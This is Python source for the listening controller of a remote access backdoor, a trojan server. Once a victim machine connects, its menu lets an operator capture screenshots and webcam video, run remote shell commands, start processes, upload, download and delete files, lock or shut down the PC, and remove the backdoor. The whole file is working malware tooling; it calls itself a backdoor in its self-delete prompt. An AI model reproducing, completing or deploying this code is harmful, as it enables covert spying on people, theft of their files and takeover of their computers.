import socket
import time
import os
import re

HOST = "0.0.0.0"
PORT = 5005
BUFFER = 8192

send = lambda data: conn.send(bytes(data, "utf-8"))
recv = lambda buffer: conn.recv(BUFFER)

def sendAll(data):
    if (isinstance(data, bytes)):
        conn.send(bytes(str(len(data)), "utf-8"))
        if (conn_stream()):
            conn.send(data)
    else:
        data = str(data, "utf-8")
        send(str(len(data)), "utf-8")
        if (conn_stream()):
            send(data)

def recvAll(bufsize):
    data = bytes()

    send("success")
    while (len(data) < int(bufsize)):
        data += recv(int(bufsize))
    return data

def recvAll_Verbose(bufsize):
    data = bytes()

    send("success")
    while (len(data) < int(bufsize)):
        data += recv(int(bufsize))
        print("Receiving: {:,} Bytes\r".format(len(data)), end="")
    return data

def conn_stream():
    if (b"success" in recv(BUFFER)):
        return True

def RemoteConnect():
    global conn, address, client

    objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    objSocket.bind((HOST, PORT))
    objSocket.listen(socket.SOMAXCONN)

    print(f"Listening on PORT: ({PORT})\n" + "-"*25)
    while (True):
        try:
            conn, address = objSocket.accept()
            client = str(recv(BUFFER), "utf-8").split("|")
            print(f"Connection Established ~ ({address[0]} / {client[0]})\n")
            break

        except socket.error:
            print(f"[!] Failed Connecting to Remote Machine ~ {address[0]}\n")
            exit(1)

def Commands():
    print("______________________________________")
    print("(Connection Commands)                 |\n" + \
          "                                      |")
    print("[-tmc] Terminate Connection           |")
    print("[-apc] Append Connection              |")
    print("______________________________________|")
    print("(User Interface Commands)             |\n" + \
          "                                      |")
    print("[-vmb] Send Message (VBS-Box)         |")
    print("[-cps] Capture Screenshot             |")
    print("[-cpw] Capture Webcam                 |")
    print("[-cwp] Change Wallpaper               |")
    print("______________________________________|")
    print("(System Commands)                     |\n" + \
          "                                      |")
    print("[-vsi] View System Information        |")
    print("[-stp] Start Process                  |")
    print("[-rms] Remote CMD                     |")
    print("[-sdc] Shutdown Computer              |")
    print("[-rsc] Restart Computer               |")
    print("[-lkc] Lock Computer                  |")
    print("______________________________________|")
    print("(File Commands)                       |\n" + \
          "                                      |")
    print("[-gcd] Get Current Directory          |")
    print("[-vwf] View Files                     |")
    print("[-sdf] Send File                      |")
    print("[-rvf] Receive File                   |")
    print("[-dlf] Delete File                    |")
    print("[-dls] Delete Self                    |")
    print("______________________________________|\n")

def VBSMessageBox():
    message = input("\nType Message: ").strip()
    if (len(message) >= 1000):
        print("[-] Maximum Length: 1000 Characters\n")

    elif not (len(message) <= 0):
        send("msgbox")
        if (conn_stream()):
            send(message)

    print(str(recv(BUFFER), "utf-8") + "\n")

def CaptureScreenshot():
    send("screenshot")

    if not (str(recv(BUFFER), "utf-8") == "valid"):
        print("[!] Unable to Capture Screenshot\n")
        return

    start = time.time()
    print("Capturing Screenshot...")
    try:
        fileContent = recvAll_Verbose(recv(BUFFER))
        with open(time.strftime("screenshot-%Y%m%d%H%M%S.png"), "wb") as ImageFile:
            ImageFile.write(fileContent)

        end = time.time()
        print("\n\nImage has been Received\nSize: " +
            "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            len(fileContent) / 1024, len(fileContent), end - start))

    except:
        print("[!] Error Receiving File\n")

def CaptureWebcam():
    send("webcam")

    devices = str(recv(1024), "utf-8")
    if (devices == "NO_WEBCAMS"):
        print("<No Webcams Detected>\n")
        return

    cameras = 1
    for device in devices.split("|"):
        if (len(device) == 0):
            continue

        print(f"{cameras}. {device}")
        cameras += 1

    try:
        cameraID = input("\nChoose Device: ")
        if not int(cameraID) in range(1, cameras):
            print("Unrecognized Webcam ID\n")
            raise ValueError

        send(str(cameraID))

        duration = int(input("Capture Duration? (seconds): ").strip())
        if (duration < 1 or duration > 60):
            print("Duration Range: 1-60 seconds\n")
            raise ValueError

        send(str(duration * 1000))

    except ValueError:
        send("0")
        return

    if not (str(recv(BUFFER), "utf-8") == "valid"):
        print("[!] Unable to Capture Webcam\n")
        return

    start = time.time()
    print("\nWebcam Captured")
    try:
        fileContent = recvAll_Verbose(recv(BUFFER))
        with open(time.strftime("webcam-%Y%m%d%H%M%S.avi"), "wb") as ImageFile:
            ImageFile.write(fileContent)

        end = time.time()
        print("\n\nCapture has been Received\nSize: " +
            "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            len(fileContent) / 1024, len(fileContent), end - start))

    except:
        print("[!] Error Receiving File\n")

def ChangeWallpaper():
    localFile = input("\nChoose Local Image File: ")
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return

    elif not (re.search(re.compile("[^\\s]+(.*?)\\.(jpg|jpeg|png)$"), localFile)):
        print("[!] Invalid File Type - Required: (JPEG, JPG, PNG)\n")
        return

    send("wallpaper")
    if (conn_stream()):
        send(os.path.basename(localFile))

    with open(localFile, "rb") as ImageFile:
        fileContent = ImageFile.read()

    print("Sending Image...")
    sendAll(fileContent)
    print("Wallpaper Changed\n")

def SystemInformation():
    print(f"\nComputer:    <{client[0]}>")
    print(f"Username:    <{client[1]}>")
    print(f"IP Address:  <{address[0]}>\n")

def StartProcess():
    process = input("\nRemote File Path: ")
    send("process")
    if (conn_stream()):
        send(process)

    if not (str(recv(BUFFER), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return

    print(str(recv(BUFFER), "utf-8") + "\n")

def RemoteCMD():
    send("remote")
    remoteDirectory = str(recv(BUFFER), "utf-8")

    while (True):
        command = input(f"\n({address[0]} ~ {remoteDirectory})> ").strip().lower()
        if (command == "exit"):
            send(command); print("<Exited Remote CMD>\n")
            break

        elif (command == "cls" or command == "clear"):
            os.system("clear" if os.name == "posix" else "cls")

        elif ("start" in command or "tree" in command or "cd" in command or 
                "cmd" in command or "powershell" in command):

            print("[!] Unable to use this Command")

        elif (len(command) > 0):
            send(command)
            output = str(recvAll(recv(BUFFER)), "utf-8")

            if (len(output) == 0):
                print("No Output ~ Command Executed")
            else:
                print(output, end="")

def ShutdownComputer():
    send("shutdown")
    print(f"Powering Off PC ~ [{client[0]}]\n")

def RestartComputer():
    send("restart")
    print(f"Restarting PC ~ [{client[0]}]\n")

def LockComputer():
    send("lock")
    print(f"Locking PC ~ [{client[0]}]\n")

def CurrentDirectory():
    send("directory")
    print(str(recv(BUFFER), "utf-8").replace("\\", "/") + "\n")

def ViewFiles():
    directory = input("\nRemote Directory: ")
    send("files")
    if (conn_stream()):
        send(directory)

    if not (str(recv(BUFFER), "utf-8") == "valid"):
        print("[!] Unable to find Remote Directory\n")
        return

    clientFiles = recvAll(recv(BUFFER)).split(b"|")
    fileCount = -1
    files = str()

    for file in clientFiles:
        try:
            files += str(file, "utf-8") + "\n"
            fileCount += 1
        except UnicodeDecodeError:
            pass

    if (fileCount <= 0):
        print("[!] Empty Directory\n")
    elif (len(files) >= 1000):
        print(f"File Count: [{fileCount}]\nCharacter Count: [{len(files)}]\n\n" + files, end="")
    else:
        print(f"File Count: [{fileCount}]\nCharacter Count: [{len(files)}]\n")
        for line in files.splitlines():
            print(line)
            time.sleep(0.03)

def SendFile():
    localFile = input("\nLocal File Path: ")
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return
        
    send("receive")
    if (conn_stream()):
        send(os.path.basename(localFile))

    with open(localFile, "rb") as file:
        fileContent = file.read()
        
    start = time.time()
    print("Sending File...")
    sendAll(fileContent)
    end = time.time()
    
    print("\nFile Sent: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
        (os.path.basename(localFile)), len(fileContent) / 1024, len(fileContent), end - start))
        
def ReceiveFile():
    filePath = input("\nRemote File Path: ").replace("/", "\\")
    send("send")
    if (conn_stream()):
        send(filePath)

    if not (str(recv(BUFFER), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return
        
    start = time.time()
    try:
        fileContent = recvAll_Verbose(recv(BUFFER))
        fileName = filePath.split("\\")[-1]

        with open(fileName, "wb") as RemoteFile:
            RemoteFile.write(fileContent)

        end = time.time()
        print("\n\nFile Received: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            fileName, len(fileContent) / 1024, len(fileContent), end - start))
    
    except: print("[!] Error Receiving File\n")

def DeleteFile():
    filePath = input("\nRemote File Path: ")
    send("delfile")
    if (conn_stream()):
        send(filePath)

    if not (str(recv(BUFFER), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return

    print(str(recv(BUFFER), "utf-8") + "\n")

def DeleteSelf():
    if not (input("Delete Backdoor off Client's Computer? (y/n): ").lower().strip() == "y"):
        print(); return

    send("delself")
    print(f"Backdoor has been removed off Remote Computer ~ [{client[0]}]\n")
    conn.close()
    exit(0)

def RemoteCommands():
     while (True):
        try:
            command = input(f"({address[0]})> ").lower().strip()
            if (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")

            elif (command == "?" or command == "help"):
                Commands()
            
            elif (command == "-tmc"):
                send("terminate"); print(f"Terminated Connection ~ [{address[0]} / {client[0]}]\n")
                break
                
            elif (command == "-apc"):
                print(f"Appended Connection ~ [{client[0]}]\n")
                break

            elif (command == "-vmb"):
                VBSMessageBox()

            elif (command == "-cps"):
                CaptureScreenshot()

            elif (command == "-cpw"):
                CaptureWebcam()

            elif (command == "-cwp"):
                ChangeWallpaper()

            elif (command == "-vsi"):
                SystemInformation()

            elif (command == "-stp"):
                StartProcess()

            elif (command == "-rms"):
                RemoteCMD()

            elif (command == "-sdc"):
                ShutdownComputer()

            elif (command == "-rsc"):
                RestartComputer()
            
            elif (command == "-lkc"):
                LockComputer()

            elif (command == "-gcd"):
                CurrentDirectory()

            elif (command == "-vwf"):
                ViewFiles()

            elif (command == "-sdf"):
                SendFile()
                
            elif (command == "-rvf"):
                ReceiveFile()

            elif (command == "-dlf"):
                DeleteFile()

            elif (command == "-dls"):
                DeleteSelf()

        except KeyboardInterrupt:
            print("\n[Keyboard Interrupted ~ Connection Appended]\n")
            break

        except BrokenPipeError:
            print("\n[!] Client Timed Out ~ [Retry Connecting]\n")
            break

        except Exception as e:
            print(f"\n[-] Lost Connection to ({address[0]})\n" + f"Error Message: {e}\n")
            break

RemoteConnect()
RemoteCommands()
